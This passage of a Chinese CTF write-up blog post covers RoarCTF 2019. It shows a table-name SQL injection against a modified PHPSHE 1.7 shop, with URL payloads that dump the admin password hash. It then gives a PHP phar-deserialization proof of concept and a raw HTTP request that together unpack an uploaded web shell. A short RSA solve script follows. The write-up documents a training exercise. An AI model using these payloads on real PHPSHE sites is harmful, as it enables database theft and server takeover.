<p>回溯参数<strong>$<em>g</em>id</strong>来源，跟进全局文件<strong>common.php</strong></p>
<p><img src="../../../../img/roarctf/45.png" alt=""></p>
<p>GET传参id后，经过变量覆盖变成变量<strong><em>g</em>id</strong></p>
<p>然后跟进<strong>pe_dbhold</strong>函数</p>
<p><img src="../../../../img/roarctf/46.png" alt=""></p>
<p>该函数作用是对传入的参数进行<strong>addslashes转义</strong>的处理，然后处理后的id参数<strong>order_id</strong>，首先传入了函数<strong>order_table</strong></p>
<p><img src="../../../../img/roarctf/47.png" alt=""></p>
<p>我们可以发现，在获取表名时，如果id参数中存在字符<strong>_</strong>，时，会进行截取的操作，由此我们可以控制要<strong>查询的表名</strong></p>
<p>然后跟进查询函数<strong>pe_select</strong>，对传入的where参数<strong>array(‘order_id’=&gt;$order_id)</strong>又经过了<strong>_dowhere</strong>函数的处理</p>
<p><img src="../../../../img/roarctf/48.png" alt=""></p>
<p><img src="../../../../img/roarctf/49.png" alt=""></p>
<p>经过<strong>_dowhere</strong>函数处理后，where参数就变成了<strong><code>order_id</code>=’$order_id’</strong></p>
<p>注意到，这边因为<strong>order_id</strong>已经被单引号包裹了，而前面分析发现我们输入的参数<strong>id</strong>是有经过<strong>addslashes</strong>函数的转义处理，所以，我们无法在where后进行注入</p>
<p>但是，因为表名存在<strong>_</strong>截取，并且表名是没有被单引号包裹的，所以，可以通过<strong>表名</strong>来进行注入</p>
<p>传入payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure>

<p>拼接后的sql语句就变成了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `order_pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12#` where `order_id` = &apos;pay` where 1=1 union select 1,2,user(),4,5,6,7,8,9,10,11,12#_&apos; limit 1</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/roarctf/60.png" alt=""></p>
<p>然后就是剩下的正常注入过程了，但是这边因为截取了字符<strong>_</strong>，我们无法通过<strong>information_schema</strong>来查表，所以，只能通过不知道列名的情况下进行查询<strong>admin</strong>密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/include/plugin/payment/alipay/pay.php?id=pay`%20where%201=1%20union%20select%201,2,((select`3`from(select%201,2,3,4,5,6%20union%20select%20*%20from%20admin)a%20limit%201,1)),4,5,6,7,8,9,10,11,12%23_</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/roarctf/42.png" alt=""></p>
<p>获得管理员密码的md5，解密得admin密码：<strong>altman777</strong></p>
<p><img src="../../../../img/roarctf/43.png" alt=""></p>
<h4 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h4><p>拿到admin密码后登陆后台，品牌管理处存在一处上传点，测试发现可以上传jpg，txt，zip文件</p>
<p><img src="../../../../img/roarctf/50.png" alt=""></p>
<p>并且上传后，我们可以知道上传文件的绝对路径：</p>
<p><img src="../../../../img/roarctf/51.png" alt=""></p>
<p>把题目源码跟官方对应版本的phpshe1.7 <strong>diff</strong>过了会发现，在<strong>/include/class/pclzip.class.php</strong>文件中的类<strong>PclZip</strong>中多出了一个魔术方法：</p>
<p><img src="../../../../img/roarctf/59.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;extract(PCLZIP_OPT_PATH, <span class="keyword">$this</span>-&gt;save_path);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>粗略的看一下这个类，再结合一下其他代码，就能猜到这里<strong>extract</strong>作用是解压压缩包的作用</p>
<p><img src="../../../../img/roarctf/52.png" alt=""></p>
<p>到这里就能差不多猜到需要通过<strong>phar反序列化</strong>来触发了</p>
<p>反序列化的点在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?mod=moban&amp;act=del</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/roarctf/53.png" alt=""></p>
<p>通过csrf校验和转义处理后，触发了<strong>pe_dirdel</strong>函数，跟进一下</p>
<p><img src="../../../../img/roarctf/54.png" alt=""></p>
<p>看到了触发<strong>phar反序列化</strong>的关键函数：<strong>is_file</strong></p>
<p>所以思路就很明确了：通过moban.php的del功能传入<strong>tpl</strong>参数，通过<strong>is_file</strong>函数触发<strong>phar反序列化</strong>，对之前上传的包含shell的zip文件进行解压缩得到shell</p>
<p>生成phar文件的POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PclZip</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ----- Filename of the zip file</span></span><br><span class="line">    <span class="keyword">var</span> $zipname = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- File descriptor of the zip file</span></span><br><span class="line">    <span class="keyword">var</span> $zip_fd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- Internal error handling</span></span><br><span class="line">    <span class="keyword">var</span> $error_code = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> $error_string = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ----- Current status of the magic_quotes_runtime</span></span><br><span class="line">    <span class="comment">// This value store the php configuration for magic_quotes</span></span><br><span class="line">    <span class="comment">// The class can then disable the magic_quotes and reset it after</span></span><br><span class="line">    <span class="keyword">var</span> $magic_quotes_status;</span><br><span class="line">    <span class="keyword">var</span> $save_path;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="comment">// Function : PclZip()</span></span><br><span class="line">    <span class="comment">// Description :</span></span><br><span class="line">    <span class="comment">//   Creates a PclZip object and set the name of the associated Zip archive</span></span><br><span class="line">    <span class="comment">//   filename.</span></span><br><span class="line">    <span class="comment">//   Note that no real action is taken, if the archive does not exist it is not</span></span><br><span class="line">    <span class="comment">//   created. Use create() for that.</span></span><br><span class="line">    <span class="comment">// --------------------------------------------------------------------------------</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($p_zipname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctStart(__FILE__, __LINE__, 'PclZip::PclZip', "zipname=$p_zipname");</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Tests the zlib</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Set the attributes</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;zipname = $p_zipname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;zip_fd = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;magic_quotes_status = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ----- Return</span></span><br><span class="line">        <span class="comment">//--(MAGIC-PclTrace)--//PclTraceFctEnd(__FILE__, __LINE__, 1);</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$f=<span class="keyword">new</span> PclZip(<span class="string">"/var/www/html/data/attachment/brand/7.zip"</span>);</span><br><span class="line">$f-&gt;save_path=<span class="string">'/var/www/html/data'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($f);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($f); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里主要设置<strong>PclZip</strong>类的两个参数，一个是<strong>zipname</strong>，即我们上传的zip文件绝对路径；另一个参数是<strong>save_path</strong>，即解压后的路径，这里设置可写的路径<strong>data</strong>下</p>
<p>将生成的<strong>phar</strong>文件同样的方式上传。抓包修改后缀名为<strong>txt</strong>，同样得到绝对路径</p>
<p><img src="../../../../img/roarctf/55.png" alt=""></p>
<p>然后执行payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /admin.php?mod=moban&amp;act=del&amp;token=2272ae99372205cb4cb3dcacfd190685&amp;tpl=phar:///var/www/html/data/attachment/brand/8.txt HTTP/1.1</span><br><span class="line">Host: 3c5b1c6d-7bc1-4b64-96b2-e1ab2b8e66c2.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Referer:http://3c5b1c6d-7bc1-4b64-96b2-e1ab2b8e66c2.node3.buuoj.cn/admin.php?mod=moban</span><br><span class="line">Cookie: PHPSESSID=ovd3flre54f5968psdhtufuhc5</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>这里需要注意要传入参数<strong>token</strong>和<strong>Referer</strong>，来通过csrf的校验，至于为什么，看看源码就知道了：</p>
<p><img src="../../../../img/roarctf/56.png" alt=""></p>
<p>因为token存储在session中，我们随便抓一个上传文件的包就能得到token值了</p>
<p><img src="../../../../img/roarctf/57.png" alt=""></p>
<p>最后访问data目录下的shell文件，执行命令获得flag</p>
<p><img src="../../../../img/roarctf/58.png" alt=""></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>利用A=(((y%x)<strong>5)%(x%y))</strong>2019+y**316+(y+1)/x和A的结果求出x,y</p>
<p>将n爆破pq,求z</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">n =  <span class="number">117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127</span></span><br><span class="line"></span><br><span class="line">c =  <span class="number">75186169332770398011618387278278132278790899252552138882799075432380607926731546030253687400295924217369315868839672386616943227315064045460865365296683033483186291570240079759200380250862319608787524113935879604728967164231477966741805601564635364322718438051545168770427777047667842857584346659655292503627681225184738425341914431617445650748762586933275572200060984083928949491872172407901109108320296584642767891651443970128071209300594102046815811229697489154488296004024544579726109722995921635677648742873800015194793794148142345457719541079982444120634269256199324030425798299206933898605904024426172410823</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569</span></span><br><span class="line"></span><br><span class="line">q = <span class="number">139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>



</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/10/14/RoarCTF/">https://nikoeurus.github.io/2019/10/14/RoarCTF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Roarctf/">Roarctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/10/28/UNCTF/"><i class="fa fa-chevron-left">  </i><span>2019 UNCTF(安恒杯)题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/09/26/inctf-Web/"><span>2019 inctf-Web部分题解WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>